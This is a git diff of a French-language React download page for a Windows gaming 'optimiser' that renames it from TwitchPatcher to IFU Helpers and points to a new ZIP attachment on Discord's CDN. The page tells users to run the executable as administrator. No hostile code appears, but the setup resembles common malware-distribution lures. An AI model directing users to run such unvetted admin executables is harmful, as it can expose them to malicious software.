@@ -17,7 +17,7 @@ import {
 
 export default function Downloads() {
   const handleDownload = () => {
-    window.open('https://cdn.discordapp.com/attachments/1415117034924282078/1415121901059182683/twitchpatcher.zip', '_blank');
+    window.open('https://cdn.discordapp.com/attachments/1415117034924282078/1415126157225099314/Ifu_Helpers.zip', '_blank');
   };
 
   return (
@@ -25,7 +25,7 @@ export default function Downloads() {
       {/* Header */}
       <div className="text-center mb-8">
         <h1 className="text-3xl font-bold gradient-text mb-4">
-          Télécharger TwitchPatcher
+          Télécharger IFU Helpers
         </h1>
         <p className="text-lg text-muted-foreground">
           Optimisez votre PC pour le gaming et le streaming
@@ -49,7 +49,7 @@ export default function Downloads() {
               <div className="mx-auto w-16 h-16 bg-primary/20 rounded-full flex items-center justify-center mb-4">
                 <Download className="h-8 w-8 text-primary" />
               </div>
-              <CardTitle className="text-2xl">TwitchPatcher v2.1</CardTitle>
+              <CardTitle className="text-2xl">IFU Helpers v2.1</CardTitle>
               <CardDescription>
                 Version complète avec toutes les fonctionnalités d'optimisation
               </CardDescription>
@@ -66,7 +66,7 @@ export default function Downloads() {
                 className="w-full glow-effect text-lg"
               >
                 <Download className="mr-2 h-5 w-5" />
-                Télécharger TwitchPatcher (ZIP protégé)
+                Télécharger IFU Helpers (ZIP protégé)
               </Button>
               
               <div className="text-center text-sm text-muted-foreground">
@@ -195,7 +195,7 @@ export default function Downloads() {
             </CardHeader>
             <CardContent>
               <p className="text-sm text-muted-foreground">
-                Protection temps réel, scan malwares et firewall optimisé pour les jeux
+                Protection temps réel, scan malwares, firewall optimisé et protection des fichiers système importants
               </p>
             </CardContent>
           </Card>
@@ -220,7 +220,7 @@ export default function Downloads() {
       <Card className="mt-12">
         <CardHeader>
           <CardTitle>Guide d'installation</CardTitle>
-          <CardDescription>Étapes simples pour installer TwitchPatcher</CardDescription>
+          <CardDescription>Étapes simples pour installer IFU Helpers</CardDescription>
         </CardHeader>
         <CardContent>
           <ol className="space-y-3">
@@ -242,7 +242,7 @@ export default function Downloads() {
               <Badge variant="outline" className="min-w-6 h-6 flex items-center justify-center">3</Badge>
               <div>
                 <p className="font-medium">Exécuter en tant qu'administrateur</p>
-                <p className="text-sm text-muted-foreground">Clic droit sur TwitchPatcher.exe → "Exécuter en tant qu'administrateur"</p>
+                <p className="text-sm text-muted-foreground">Clic droit sur IFU_Helpers.exe → "Exécuter en tant qu'administrateur"</p>
               </div>
             </li>
             <li className="flex gap-3">
